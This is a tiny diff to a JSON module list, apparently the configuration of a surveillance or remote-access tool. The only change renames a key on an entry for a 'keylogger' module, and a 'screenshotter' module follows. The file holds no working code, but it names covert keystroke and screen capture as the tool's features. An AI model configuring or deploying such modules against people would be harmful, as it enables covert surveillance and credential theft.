@@ -1,6 +1,6 @@
 [
     {
-	"modules":"keylogger"
+	"module":"keylogger"
 	},
 	{
 	"module":"screenshotter"
